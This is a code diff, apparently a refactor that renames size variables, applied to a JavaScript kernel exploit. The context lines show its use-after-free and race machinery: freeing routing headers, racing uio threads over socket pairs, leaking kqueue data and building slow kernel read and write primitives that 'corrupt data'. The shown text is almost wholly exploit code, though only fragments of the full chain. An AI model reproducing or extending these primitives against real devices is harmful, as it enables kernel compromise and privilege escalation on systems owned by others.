@@ -363,10 +363,10 @@ function init() {
   uio_iov_read = iovec.new(uio_iov_addr);
   uio_iov_write = iovec.new(uio_iov_addr);
 
-  const dummy_sz = 0x1000;
-  const dummy_addr = mem.alloc(dummy_sz);
+  const dummy_size = 0x1000;
+  const dummy_addr = mem.alloc(dummy_size);
 
-  mem.bset(dummy_addr, dummy_sz, 0x41);
+  mem.bset(dummy_addr, dummy_size, 0x41);
 
   uio_iov_read.iov_base = dummy_addr;
   uio_iov_write.iov_base = dummy_addr;
@@ -675,31 +675,31 @@ function leak_kqueue() {
   logger?.info("Leak kqueue completed !!");
 }
 
-function kread_slow(addr, sz) {
+function kread_slow(addr, size) {
   // Prepare leak buffers
   const leak_bufs = new Array(uio_threads.length);
   for (let i = 0; i < leak_bufs.length; i++) {
-    leak_bufs[i] = mem.alloc(sz);
+    leak_bufs[i] = mem.alloc(size);
   }
 
   // Set send buf size
-  const buf_sz_addr = mem.alloc(4);
+  const buf_size_addr = mem.alloc(4);
 
-  arw.view(buf_sz_addr).setInt32(0, sz, true);
+  arw.view(buf_size_addr).setInt32(0, size, true);
 
-  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4) === -1) {
+  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
     throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
   }
 
-  mem.free(buf_sz_addr);
+  mem.free(buf_size_addr);
 
   // Fill queue
-  if (fn.write.invoke(uio_ss[1], tmp, sz) === -1n) {
+  if (fn.write.invoke(uio_ss[1], tmp, size) === -1n) {
     throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
   }
 
   // Set iov length
-  uio_iov_read.iov_len = sz.bigint();
+  uio_iov_read.iov_len = size.bigint();
 
   // Free one
   free_rthdr(triplets[2]);
@@ -726,12 +726,12 @@ function kread_slow(addr, sz) {
     }
 
     // Wake up all threads
-    if (fn.read.invoke(uio_ss[0], tmp, sz) === -1n) {
+    if (fn.read.invoke(uio_ss[0], tmp, size) === -1n) {
       throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
     }
 
     for (let j = 0; j < leak_bufs.length; j++) {
-      if (fn.read.invoke(uio_ss[0], leak_bufs[j], sz) === -1n) {
+      if (fn.read.invoke(uio_ss[0], leak_bufs[j], size) === -1n) {
         throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
       }
     }
@@ -739,7 +739,7 @@ function kread_slow(addr, sz) {
     uio_worker.wait_for_finished();
 
     // Fill queue
-    if (fn.write.invoke(uio_ss[1], tmp, sz) === -1n) {
+    if (fn.write.invoke(uio_ss[1], tmp, size) === -1n) {
       throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
     }
   }
@@ -808,7 +808,7 @@ function kread_slow(addr, sz) {
   }
 
   // Wake up all threads
-  if (fn.read.invoke(uio_ss[0], tmp, sz) === -1n) {
+  if (fn.read.invoke(uio_ss[0], tmp, size) === -1n) {
     throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
   }
 
@@ -817,7 +817,7 @@ function kread_slow(addr, sz) {
 
   // Get leak
   for (let i = 0; i < leak_bufs.length; i++) {
-    if (fn.read.invoke(uio_ss[0], leak_bufs[i], sz) === -1n) {
+    if (fn.read.invoke(uio_ss[0], leak_bufs[i], size) === -1n) {
       throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
     }
 
@@ -856,20 +856,20 @@ function kread_slow(addr, sz) {
   return leak_buf;
 }
 
-function kwrite_slow(dst, src, sz) {
+function kwrite_slow(dst, src, size) {
   // Set send buf size
-  const buf_sz_addr = mem.alloc(4);
+  const buf_size_addr = mem.alloc(4);
 
-  arw.view(buf_sz_addr).setInt32(0, sz, true);
+  arw.view(buf_size_addr).setInt32(0, size, true);
 
-  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4) === -1) {
+  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
     throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
   }
 
-  mem.free(buf_sz_addr);
+  mem.free(buf_size_addr);
 
   // Set iov length
-  uio_iov_write.iov_len = sz.bigint();
+  uio_iov_write.iov_len = size.bigint();
 
   // Free one
   free_rthdr(triplets[2]);
@@ -897,7 +897,7 @@ function kwrite_slow(dst, src, sz) {
 
     // Wake up all threads
     for (let j = 0; j < uio_threads.length; j++) {
-      if (fn.write.invoke(uio_ss[1], src, sz) === -1n) {
+      if (fn.write.invoke(uio_ss[1], src, size) === -1n) {
         throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
       }
     }
@@ -970,7 +970,7 @@ function kwrite_slow(dst, src, sz) {
 
   // Corrupt data
   for (let i = 0; i < uio_threads.length; i++) {
-    if (fn.write.invoke(uio_ss[1], src, sz) === -1n) {
+    if (fn.write.invoke(uio_ss[1], src, size) === -1n) {
       throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
     }
   }
